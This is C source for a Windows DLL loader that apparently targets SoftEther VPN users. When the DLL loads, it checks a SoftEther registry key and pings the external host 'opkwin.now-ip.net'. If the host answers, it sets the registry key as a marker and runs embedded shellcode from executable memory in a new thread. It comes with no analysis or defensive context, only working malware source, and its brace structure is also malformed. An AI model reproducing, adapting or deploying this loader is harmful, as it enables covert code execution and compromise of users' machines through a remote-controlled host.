#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include "decode.h"
DWORD WINAPI Threadf(LPVOID lpParameter)
{
	LPVOID newMem;
	HANDLE currentps;
	SIZE_T bytes;
	BOOL check = FALSE;
	currentps = GetCurrentProcess(); //get current process handler
	newMem = VirtualAllocEx(currentps, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(newMem == NULL)
		return -1;
	check = WriteProcessMemory(currentps, newMem, (LPVOID)&code, SCSIZE, &bytes);
	if(!check)
		return -2;
	((void(*)())newMem)();
		return 1;
}
BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    HANDLE hIcmpFile;
    unsigned long ipaddr = INADDR_NONE;
    DWORD dwRetVal = 0;
    char SendData[32] = "Data Buffer";
    LPVOID ReplyBuffer = NULL;
    DWORD ReplySize = 0;
    HANDLE threadH;
    struct hostent *remoteHost;
    char *host_addr;
    struct in_addr addr;
    HKEY hKey;
    LONG nError;
    LPCTSTR  sk; 
    WSADATA wsaData;
    sk=TEXT("Software\\SoftEther Project\\SoftEther VPN\\Userinfo");
    nError=RegOpenKeyEx(HKEY_CURRENT_USER, sk, NULL, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey);
    if(nError!=ERROR_SUCCESS){
   // nError=RegCreateKeyEx(HKEY_CURRENT_USER, sk,NULL,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS | KEY_WOW64_64KEY,NULL,&hKey,NULL);
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    remoteHost = gethostbyname("opkwin.now-ip.net");
    addr.s_addr = *(u_long *) remoteHost->h_addr_list[0];
    ipaddr = inet_addr(inet_ntoa(addr));
    hIcmpFile = IcmpCreateFile();
    if (hIcmpFile == INVALID_HANDLE_VALUE) {
    return 0;
}
    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
    ReplyBuffer = (VOID*) malloc(ReplySize);
    dwRetVal = IcmpSendEcho(hIcmpFile, ipaddr, SendData, sizeof(SendData),NULL, ReplyBuffer, ReplySize, 450);
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            if(dwRetVal != 0){
            nError=RegCreateKeyEx(HKEY_CURRENT_USER, sk,NULL,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS | KEY_WOW64_64KEY,NULL,&hKey,NULL);
	    threadH = CreateThread(NULL, 0, Threadf, NULL, 0, NULL);
	}
	    CloseHandle(threadH);
	    break;
        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

       case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    } }
} 
